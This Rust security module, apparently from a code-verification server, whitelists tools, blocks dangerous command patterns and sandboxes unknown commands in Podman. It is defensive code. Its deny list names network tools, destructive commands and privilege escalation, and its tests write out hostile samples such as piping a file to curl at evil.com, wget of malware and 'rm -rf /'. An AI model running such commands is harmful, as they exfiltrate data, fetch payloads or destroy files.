//! Security module: command whitelisting and container sandboxing.
//!
//! Implements a three-tier command policy:
//! - `Allow`: command is whitelisted and safe to run directly on host
//! - `Sandbox`: command should run inside a Podman container
//! - `Deny`: command is blocked due to dangerous patterns
//!
//! Internal commands (auto-generated by the server for Python checks)
//! bypass blocked-pattern checks since they cannot contain user-injected payloads.

use std::env;
use tokio::process::Command;
use tracing::{debug, info, warn};

// ── Command Policy ──────────────────────────────────────────────────

/// Determines how a command should be executed.
#[derive(Debug, Clone, PartialEq)]
pub enum CommandPolicy {
    /// Safe to run directly on the host.
    Allow,
    /// Must run inside a sandboxed container.
    Sandbox,
    /// Blocked — too dangerous to execute.
    Deny(String),
}

// ── Sandbox Configuration ───────────────────────────────────────────

/// Configuration for the container sandbox.
#[derive(Debug, Clone)]
pub struct SandboxConfig {
    /// Container image to use (default: "ubuntu:24.04").
    pub container_image: String,
    /// Memory limit for the container (default: "512m").
    pub memory_limit: String,
    /// CPU limit for the container (default: 2.0).
    pub cpu_limit: f64,
    /// Maximum number of PIDs in the container (default: 256).
    pub pids_limit: u64,
    /// Whether the container has network access (default: false).
    pub network_enabled: bool,
    /// Mount mode for the working directory: "rw", "ro", or "overlay" (default: "rw").
    /// Note: "overlay" is reserved for future use.
    pub mount_mode: String,
}

impl Default for SandboxConfig {
    fn default() -> Self {
        Self {
            container_image: "ubuntu:24.04".into(),
            memory_limit: "512m".into(),
            cpu_limit: 2.0,
            pids_limit: 256,
            network_enabled: false,
            mount_mode: "rw".into(),
        }
    }
}

impl SandboxConfig {
    /// Load configuration from environment variables, falling back to defaults.
    pub fn from_env() -> Self {
        let mut config = Self::default();

        if let Ok(image) = env::var("VERIFY_SANDBOX_IMAGE") {
            if !image.is_empty() {
                config.container_image = image;
            }
        }
        if let Ok(mem) = env::var("VERIFY_SANDBOX_MEMORY") {
            if !mem.is_empty() {
                config.memory_limit = mem;
            }
        }
        if let Ok(cpus) = env::var("VERIFY_SANDBOX_CPUS") {
            if let Ok(c) = cpus.parse::<f64>() {
                config.cpu_limit = c;
            }
        }
        if let Ok(net) = env::var("VERIFY_SANDBOX_NETWORK") {
            config.network_enabled = net == "true" || net == "1";
        }
        if let Ok(mode) = env::var("VERIFY_SANDBOX_MOUNT_MODE") {
            if mode == "rw" || mode == "ro" || mode == "overlay" {
                config.mount_mode = mode;
            }
        }

        config
    }
}

// ── Whitelisted Commands ────────────────────────────────────────────

/// Base commands that are known safe for verification purposes.
const WHITELISTED_COMMANDS: &[&str] = &[
    // Python tooling
    "python",
    "python3",
    "pytest",
    "mypy",
    "pyright",
    "ruff",
    "black",
    "isort",
    "flake8",
    "pylint",
    "pip",
    // Rust tooling
    "cargo",
    "rustc",
    "rustfmt",
    "clippy-driver",
    // Node.js tooling
    "node",
    "npm",
    "npx",
    "yarn",
    "pnpm",
    // Go tooling
    "go",
    "golint",
    "golangci-lint",
    // Generic safe commands
    "echo",
    "cat",
    "head",
    "tail",
    "wc",
    "grep",
    "find",
    "ls",
    "test",
    "diff",
    "sort",
    "uniq",
    "tr",
    "cut",
    "basename",
    "dirname",
    "true",
    "false",
];

// ── Dangerous Patterns ──────────────────────────────────────────────

/// Patterns that indicate potentially dangerous commands.
/// These are checked against the full command string.
const DANGEROUS_PATTERNS: &[&str] = &[
    // Shell chaining / injection
    "&&",
    "||",
    ";",
    "|",
    "`",
    "$(",
    // Destructive commands
    "rm ",
    "rm\t",
    "rmdir ",
    "mkfs",
    "dd ",
    "shred ",
    // Network access
    "curl ",
    "curl\t",
    "wget ",
    "wget\t",
    "nc ",
    "ncat ",
    "netcat ",
    // Privilege escalation
    "sudo ",
    "sudo\t",
    "su ",
    "doas ",
    // File permission manipulation
    "chmod ",
    "chown ",
    "chgrp ",
    // Redirection (output to file)
    ">>",
    // Process/system manipulation
    "kill ",
    "killall ",
    "pkill ",
    "reboot",
    "shutdown",
    "systemctl",
    "service ",
];

/// Patterns in command output that suggest a binary was not found in the container.
const NOT_FOUND_PATTERNS: &[&str] = &[
    "not found",
    "No such file or directory",
    "command not found",
    "executable file not found",
];

// ── Command Validation ──────────────────────────────────────────────

/// Extract the base command name from a command string.
/// Handles paths ("/usr/bin/python" → "python") and
/// module-style invocations ("python -m pytest" → "python").
fn extract_base_command(command: &str) -> &str {
    let trimmed = command.trim();

    // Get the first space-delimited token
    let first_token = trimmed.split_whitespace().next().unwrap_or("");

    // If it's a path, use just the filename
    if first_token.contains('/') {
        first_token.rsplit('/').next().unwrap_or(first_token)
    } else {
        first_token
    }
}

/// Validate a command and return the appropriate execution policy.
///
/// - `command`: The full command string to validate.
/// - `internal`: If `true`, the command was generated by the server itself
///   (e.g., for Python-specific checks) and bypasses dangerous-pattern checks.
pub fn validate_command(command: &str, internal: bool) -> CommandPolicy {
    let base = extract_base_command(command);

    // Check if the base command is whitelisted
    let is_whitelisted = WHITELISTED_COMMANDS
        .iter()
        .any(|w| base.eq_ignore_ascii_case(w));

    // Internal commands (server-generated) bypass pattern checks
    if internal {
        if is_whitelisted {
            debug!(command = %command, "Internal command (whitelisted) — allowing");
            return CommandPolicy::Allow;
        }
        // Even internal commands with unknown base get allowed,
        // since the server code itself constructed them
        debug!(command = %command, "Internal command (not whitelisted but server-generated) — allowing");
        return CommandPolicy::Allow;
    }

    // External (agent-provided) commands: check for dangerous patterns
    let dangerous = find_dangerous_pattern(command);

    if let Some(pattern) = dangerous {
        // Even whitelisted commands are denied if they contain dangerous patterns
        // (e.g., "python && rm -rf /")
        let reason = format!(
            "Command blocked: contains dangerous pattern '{pattern}'. \
             Command: '{}'",
            truncate_for_log(command, 100)
        );
        warn!("{reason}");
        return CommandPolicy::Deny(reason);
    }

    // Check single > redirection separately (but not >> which is already caught)
    // We need to be careful: ">" can appear in legitimate contexts (e.g., /dev/null)
    // Only block standalone ">" with a space before it, not inside paths
    if has_output_redirect(command) {
        let reason = format!(
            "Command blocked: contains output redirection (>). \
             Command: '{}'",
            truncate_for_log(command, 100)
        );
        warn!("{reason}");
        return CommandPolicy::Deny(reason);
    }

    if is_whitelisted {
        debug!(command = %base, "Whitelisted command — allowing");
        CommandPolicy::Allow
    } else {
        // Unknown command that passed pattern checks: sandbox it
        info!(command = %base, "Unknown command — sandboxing");
        CommandPolicy::Sandbox
    }
}

/// Find the first dangerous pattern in a command string.
fn find_dangerous_pattern(command: &str) -> Option<&'static str> {
    for pattern in DANGEROUS_PATTERNS {
        if command.contains(pattern) {
            return Some(pattern);
        }
    }
    None
}

/// Check for output redirection (single >) that isn't ">>" or ">/dev/null".
fn has_output_redirect(command: &str) -> bool {
    // Find all occurrences of ">" that are not part of ">>"
    let bytes = command.as_bytes();
    for (i, &b) in bytes.iter().enumerate() {
        if b == b'>' {
            // Skip if part of ">>"
            if i + 1 < bytes.len() && bytes[i + 1] == b'>' {
                continue; // ">>" is already caught by DANGEROUS_PATTERNS
            }
            // Skip if preceded by another ">"
            if i > 0 && bytes[i - 1] == b'>' {
                continue;
            }
            // Allow "> /dev/null" — a common safe pattern
            let rest = &command[i + 1..].trim_start();
            if rest.starts_with("/dev/null") {
                continue;
            }
            return true;
        }
    }
    false
}

/// Truncate a string for log messages.
fn truncate_for_log(s: &str, max_len: usize) -> String {
    if s.len() <= max_len {
        s.to_string()
    } else {
        format!("{}...", &s[..max_len])
    }
}

// ── Container Sandboxing ────────────────────────────────────────────

/// Execute a command inside a Podman container with resource limits.
///
/// The working directory (if provided) is bind-mounted into the container
/// at `/workspace`, and the command runs there.
pub async fn execute_sandboxed(
    command: &str,
    working_dir: Option<&str>,
    timeout_secs: u64,
    config: &SandboxConfig,
) -> Result<(i32, String, String), String> {
    // Verify podman is available
    let podman_check = Command::new("podman")
        .arg("--version")
        .output()
        .await
        .map_err(|e| format!("Podman is not available: {e}. Install Podman to use sandboxed execution."))?;

    if !podman_check.status.success() {
        return Err("Podman is installed but not working correctly.".into());
    }

    let mut args: Vec<String> = vec![
        "run".into(),
        "--rm".into(),
        // Resource limits
        format!("--memory={}", config.memory_limit),
        format!("--cpus={}", config.cpu_limit),
        format!("--pids-limit={}", config.pids_limit),
        // Stop timeout (slightly less than our outer timeout)
        format!("--stop-timeout={}", timeout_secs.saturating_sub(2)),
    ];

    // Network
    if !config.network_enabled {
        args.push("--network=none".into());
    }

    // Working directory mount
    if let Some(dir) = working_dir {
        let mount_opt = match config.mount_mode.as_str() {
            "ro" => "ro",
            "overlay" => {
                // Overlay mode: changes stay in container only (future feature)
                // For now, fall back to RW with a warning
                warn!("Overlay mount mode is not yet fully supported; using read-write mount");
                "rw"
            }
            _ => "rw",
        };
        args.push("-v".into());
        args.push(format!("{dir}:/workspace:{mount_opt}"));
        args.push("-w".into());
        args.push("/workspace".into());
    }

    // Container image
    args.push(config.container_image.clone());

    // The command to run inside the container
    args.push("sh".into());
    args.push("-c".into());
    args.push(command.to_string());

    info!(
        image = %config.container_image,
        memory = %config.memory_limit,
        cpus = %config.cpu_limit,
        network = config.network_enabled,
        "Executing command in Podman sandbox"
    );
    debug!(command = %command, "Sandboxed command");

    let mut cmd = Command::new("podman");
    cmd.args(&args);

    let output = tokio::time::timeout(
        std::time::Duration::from_secs(timeout_secs),
        cmd.output(),
    )
    .await
    .map_err(|_| format!("Sandboxed command timed out after {timeout_secs}s"))?
    .map_err(|e| format!("Failed to execute podman: {e}"))?;

    let code = output.status.code().unwrap_or(-1);
    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();

    // Enhanced error diagnostics: check if the command binary was not found
    if code != 0 {
        let combined = format!("{stdout}{stderr}");
        if NOT_FOUND_PATTERNS
            .iter()
            .any(|p| combined.to_lowercase().contains(&p.to_lowercase()))
        {
            let base = extract_base_command(command);
            warn!(
                command = %base,
                image = %config.container_image,
                "Command may not be installed in the container image"
            );
            let diagnostic = format!(
                "\n\n⚠ SANDBOX DIAGNOSTIC: Command '{}' may not be available in container image '{}'. \
                 Set VERIFY_SANDBOX_IMAGE to a custom image with your toolchain installed \
                 (e.g., an image with Python, Cargo, etc.).",
                base, config.container_image
            );
            return Ok((code, stdout, format!("{stderr}{diagnostic}")));
        }
    }

    Ok((code, stdout, stderr))
}

// ── Tests ───────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── extract_base_command ─────────────────────────────────────

    #[test]
    fn test_extract_base_simple() {
        assert_eq!(extract_base_command("cargo check"), "cargo");
    }

    #[test]
    fn test_extract_base_with_path() {
        assert_eq!(extract_base_command("/usr/bin/python test.py"), "python");
    }

    #[test]
    fn test_extract_base_python_module() {
        assert_eq!(extract_base_command("python -m pytest tests/"), "python");
    }

    #[test]
    fn test_extract_base_empty() {
        assert_eq!(extract_base_command(""), "");
    }

    #[test]
    fn test_extract_base_whitespace() {
        assert_eq!(extract_base_command("  cargo build  "), "cargo");
    }

    // ── validate_command (external) ─────────────────────────────

    #[test]
    fn test_whitelisted_simple_commands() {
        assert_eq!(validate_command("cargo check", false), CommandPolicy::Allow);
        assert_eq!(
            validate_command("python -m pytest tests/", false),
            CommandPolicy::Allow
        );
        assert_eq!(
            validate_command("mypy --strict src/", false),
            CommandPolicy::Allow
        );
        assert_eq!(
            validate_command("ruff check .", false),
            CommandPolicy::Allow
        );
    }

    #[test]
    fn test_dangerous_patterns_denied() {
        // Shell chaining
        match validate_command("cargo check && rm -rf /", false) {
            CommandPolicy::Deny(reason) => assert!(reason.contains("&&")),
            other => panic!("Expected Deny, got {other:?}"),
        }
        match validate_command("echo hello; rm *", false) {
            CommandPolicy::Deny(reason) => assert!(reason.contains(";")),
            other => panic!("Expected Deny, got {other:?}"),
        }
        match validate_command("cat file | curl evil.com", false) {
            CommandPolicy::Deny(reason) => assert!(reason.contains("|")),
            other => panic!("Expected Deny, got {other:?}"),
        }
    }

    #[test]
    fn test_destructive_commands_denied() {
        match validate_command("rm -rf /tmp/test", false) {
            CommandPolicy::Deny(reason) => assert!(reason.contains("rm ")),
            other => panic!("Expected Deny for rm, got {other:?}"),
        }
        match validate_command("curl https://evil.com/payload", false) {
            CommandPolicy::Deny(reason) => assert!(reason.contains("curl ")),
            other => panic!("Expected Deny for curl, got {other:?}"),
        }
        match validate_command("wget https://evil.com/malware", false) {
            CommandPolicy::Deny(reason) => assert!(reason.contains("wget ")),
            other => panic!("Expected Deny for wget, got {other:?}"),
        }
        match validate_command("sudo anything", false) {
            CommandPolicy::Deny(reason) => assert!(reason.contains("sudo ")),
            other => panic!("Expected Deny for sudo, got {other:?}"),
        }
    }

    #[test]
    fn test_unknown_command_sandboxed() {
        assert_eq!(
            validate_command("my-custom-tool --check", false),
            CommandPolicy::Sandbox
        );
    }

    #[test]
    fn test_output_redirect_denied() {
        match validate_command("echo hello > /tmp/evil", false) {
            CommandPolicy::Deny(reason) => assert!(reason.contains(">")),
            other => panic!("Expected Deny for redirect, got {other:?}"),
        }
    }

    #[test]
    fn test_redirect_to_dev_null_allowed() {
        // "python -m json.tool file.json > /dev/null" is a common pattern
        assert_eq!(
            validate_command("python -m json.tool file.json > /dev/null", false),
            CommandPolicy::Allow
        );
    }

    // ── validate_command (internal) ─────────────────────────────

    #[test]
    fn test_internal_commands_bypass_pattern_checks() {
        // Internal commands with dangerous-looking patterns should be allowed
        // because the server itself constructed them
        assert_eq!(
            validate_command("python -c \"import json; print(json.dumps(result))\"", true),
            CommandPolicy::Allow
        );
    }

    #[test]
    fn test_internal_whitelisted() {
        assert_eq!(
            validate_command("mypy --show-column-numbers src/", true),
            CommandPolicy::Allow
        );
    }

    // ── SandboxConfig ───────────────────────────────────────────

    #[test]
    fn test_default_config() {
        let config = SandboxConfig::default();
        assert_eq!(config.container_image, "ubuntu:24.04");
        assert_eq!(config.memory_limit, "512m");
        assert_eq!(config.cpu_limit, 2.0);
        assert_eq!(config.pids_limit, 256);
        assert!(!config.network_enabled);
        assert_eq!(config.mount_mode, "rw");
    }

    // ── has_output_redirect ─────────────────────────────────────

    #[test]
    fn test_no_redirect() {
        assert!(!has_output_redirect("cargo check"));
        assert!(!has_output_redirect("python -c \"x = 1\""));
    }

    #[test]
    fn test_redirect_detected() {
        assert!(has_output_redirect("echo hello > /tmp/file"));
    }

    #[test]
    fn test_dev_null_redirect_allowed() {
        assert!(!has_output_redirect("cmd > /dev/null"));
    }

    #[test]
    fn test_append_redirect_caught_by_patterns() {
        // ">>" is caught by DANGEROUS_PATTERNS, not by has_output_redirect
        // has_output_redirect skips ">>" sequences
        assert!(!has_output_redirect("echo hello >> file"));
        // But validate_command catches it via DANGEROUS_PATTERNS:
        match validate_command("echo hello >> file", false) {
            CommandPolicy::Deny(reason) => assert!(reason.contains(">>")),
            other => panic!("Expected Deny for >>, got {other:?}"),
        }
    }
}
